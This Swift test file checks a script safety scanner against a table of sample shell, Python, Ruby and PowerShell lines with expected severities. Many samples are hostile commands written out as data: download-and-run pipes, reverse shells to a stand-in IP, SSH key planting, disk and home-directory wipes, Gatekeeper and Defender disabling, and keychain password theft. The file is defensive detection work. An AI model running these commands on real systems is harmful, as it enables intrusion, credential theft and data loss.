import Foundation
import Testing
@testable import CedricCore

/// One line per case, with the highest severity the scan must give it
/// ("-" = nothing flagged). Set CEDRIC_SCAN_TABLE=<path> to also write the
/// table (expected vs actual) as Markdown.
struct ScanCase: Sendable, CustomTestStringConvertible {
    let language: Language
    let line: String
    let expected: ScriptSafety.Severity?
    var testDescription: String { "\(language.rawValue): \(line)" }
}

enum ScanTable {
    static func H(_ l: Language, _ s: String) -> ScanCase { ScanCase(language: l, line: s, expected: .high) }
    static func C(_ l: Language, _ s: String) -> ScanCase { ScanCase(language: l, line: s, expected: .caution) }
    static func Q(_ l: Language, _ s: String) -> ScanCase { ScanCase(language: l, line: s, expected: nil) }

    static let cases: [ScanCase] = [
        // Download and run, by name and by path, through other stages.
        H(.shell, "curl -fsSL https://x.example/i.sh | sh"),
        H(.shell, "curl -fsSL https://x.example/i.sh | /bin/bash"),
        H(.shell, "curl -s https://x.example/i.sh | tee install.log | sh"),
        H(.shell, "wget -qO- https://x.example/i.sh | sudo /usr/bin/env bash"),
        H(.shell, "curl https://x.example/i.sh | /usr/local/bin/zsh -s -- --yes"),
        H(.shell, "/bin/bash -c \"$(curl -fsSL https://x.example/install.sh)\""),
        H(.shell, "bash <(wget -qO- https://get.example.sh)"),
        H(.shell, "curl -s https://x.example/p.py | python3"),
        H(.shell, "echo aGVsbG8K | base64 -D | /bin/sh"),
        H(.shell, "base64 --decode payload.txt | tee /tmp/x | bash"),
        // Reverse shells.
        H(.shell, "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"),
        H(.shell, "sh -i >& /dev/udp/203.0.113.5/53 0>&1"),
        H(.shell, "nc -e /bin/sh 203.0.113.5 4444"),
        H(.shell, "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.0.113.5 4444 > /tmp/f"),
        H(.shell, "ncat 203.0.113.5 4444 --exec /bin/bash"),
        C(.shell, "echo ping > /dev/tcp/localhost/8080"),
        // Setuid, SSH keys, AppleScript.
        H(.shell, "sudo chmod u+s /usr/local/bin/helper"),
        H(.shell, "chmod 4755 ./helper"),
        H(.shell, "echo 'ssh-ed25519 AAAAC3Nz attacker' >> ~/.ssh/authorized_keys"),
        H(.shell, "cat key.pub | tee -a ~/.ssh/authorized_keys"),
        C(.shell, "osascript -e 'do shell script \"ls\"'"),
        C(.shell, "osascript -e 'tell app \"Terminal\" to do script \"top\"'"),
        C(.shell, "osascript -e 'do shell script \"id\" with administrator privileges'"),
        // Deletes.
        H(.shell, "find / -name '*.log' -delete"),
        H(.shell, "sudo find /Users -type f -exec rm {} +"),
        H(.shell, "rm -rf /"),
        H(.shell, "rm -rf \"$STEAMROOT/\"*"),
        H(.shell, "diskutil eraseDisk APFS Blank disk2"),
        // macOS privacy and quarantine.
        H(.shell, "sqlite3 ~/Library/Application\\ Support/com.apple.TCC/TCC.db \"DELETE FROM access\""),
        H(.shell, "defaults write com.apple.LaunchServices LSQuarantine -bool NO"),
        C(.shell, "tccutil reset All"),
        C(.shell, "xattr -d com.apple.quarantine ~/Downloads/Tool.app"),
        H(.shell, "sudo spctl --master-disable"),
        // Persistence, credentials, system.
        H(.shell, "launchctl load ~/Library/LaunchAgents/com.x.agent.plist"),
        H(.shell, "echo 'curl -s http://x | sh' >> ~/.zshrc"),
        H(.shell, "security find-generic-password -s 'Chrome Safe Storage' -w"),
        C(.shell, "sudo softwareupdate -ia"),
        C(.shell, "curl -L -o tool.zip https://example.com/tool.zip"),
        C(.shell, "eval \"$CMD\""),
        // Python.
        H(.python, "exec(urllib.request.urlopen('https://x.example/p.py').read())"),
        H(.python, "exec(base64.b64decode(blob))"),
        H(.python, "eval(compile(zlib.decompress(data), '<x>', 'exec'))"),
        H(.python, "shutil.rmtree(os.path.expanduser('~'))"),
        H(.python, "shutil.rmtree(Path.home())"),
        C(.python, "os.system('sudo launchctl list')"),
        // Ruby.
        H(.ruby, "eval(Net::HTTP.get(URI('https://x.example/r.rb')))"),
        H(.ruby, "eval(open('https://x.example/r.rb').read)"),
        H(.ruby, "eval(URI.open('https://x.example/r.rb').read)"),
        // PowerShell.
        H(.powershell, "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')"),
        H(.powershell, "iwr https://example.com/setup.ps1 -UseBasicParsing | iex"),
        H(.powershell, "&(gcm i*x) $payload"),
        H(.powershell, "& (Get-Command I*e-Ex*) $code"),
        C(.powershell, "Start-Process powershell -Verb RunAs -ArgumentList '-File setup.ps1'"),
        H(.powershell, "Set-MpPreference -DisableRealtimeMonitoring $true"),
        H(.powershell, "Remove-Item -Recurse -Force C:\\"),
        C(.powershell, "Set-ExecutionPolicy Bypass -Scope Process -Force"),
        // A download that isn't run: caution only, not high.
        C(.shell, "curl -s https://api.example.com/status | jq .state"),
        C(.shell, "curl -fsS https://api.example.com/x | python3 -m json.tool"),
        C(.shell, "curl -f https://x.example/health || sh ./fallback.sh"),
        // Everyday lines that must stay quiet.
        Q(.shell, "brew install ripgrep fd jq"),
        Q(.shell, "brew update && brew upgrade"),
        Q(.shell, "git -C \"$REPO\" pull --ff-only"),
        Q(.shell, "git fetch origin && git rebase origin/main"),
        Q(.shell, "pip install -r requirements.txt"),
        Q(.shell, "python3 -m pip install --user -r requirements-dev.txt"),
        Q(.shell, "eval \"$(/opt/homebrew/bin/brew shellenv)\""),
        Q(.shell, "rm -rf build/ dist"),
        Q(.shell, "chmod 755 ./run.sh"),
        Q(.shell, "chmod g+s shared/"),
        Q(.shell, "find . -name '*.o' -delete"),
        Q(.shell, "find ~/Projects -name .DS_Store -delete"),
        Q(.shell, "nc -zv localhost 22"),
        Q(.shell, "shasum -a 256 tool.zip"),
        Q(.shell, "echo \"the script is done\""),
        Q(.python, "shutil.rmtree(build_dir)"),
        Q(.python, "result = eval(expr, {\"__builtins__\": {}}, names)"),
        Q(.ruby, "data = JSON.parse(File.read('config.json'))"),
        Q(.powershell, "Get-ChildItem -Path . -Filter *.log | Sort-Object LastWriteTime | Select-Object -First 5"),
        Q(.powershell, "Get-ChildItem -Recurse -File | Where-Object { $_.Length -gt 1MB } | Format-Table Name, Length"),
        Q(.powershell, "dotnet build -c Release"),
    ]

    static func actual(_ c: ScanCase) -> ScriptSafety.Severity? {
        ScriptSafety.scan(c.line, language: c.language).map(\.severity).max()
    }

    static func name(_ s: ScriptSafety.Severity?) -> String {
        switch s { case .high?: return "high"; case .caution?: return "caution"; case nil: return "-" }
    }

    static func markdown() -> String {
        var out = "# Script scan sample table\n\n\(cases.count) lines. Severity is the highest finding on the line; \"-\" is nothing flagged.\n\n"
        out += "| # | Language | Line | Expected | Actual | Categories |\n|---|---|---|---|---|---|\n"
        for (i, c) in cases.enumerated() {
            let cats = ScriptSafety.scan(c.line, language: c.language).map(\.category.rawValue).joined(separator: ", ")
            let line = c.line.replacingOccurrences(of: "|", with: "\\|").replacingOccurrences(of: "`", with: "'")
            out += "| \(i + 1) | \(c.language.rawValue) | `\(line)` | \(name(c.expected)) | \(name(actual(c)))\(actual(c) == c.expected ? "" : " ✗") | \(cats) |\n"
        }
        return out
    }
}

@Suite struct ScriptScanTableTests {
    @Test(arguments: ScanTable.cases)
    func severity(_ c: ScanCase) {
        #expect(ScanTable.actual(c) == c.expected, "\(c.line)")
    }

    @Test func tableIsBigEnoughAndWritten() throws {
        #expect(ScanTable.cases.count >= 60)
        #expect(ScanTable.cases.contains { $0.expected == nil })
        if let path = ProcessInfo.processInfo.environment["CEDRIC_SCAN_TABLE"], !path.isEmpty {
            try ScanTable.markdown().write(toFile: path, atomically: true, encoding: .utf8)
        }
    }
}
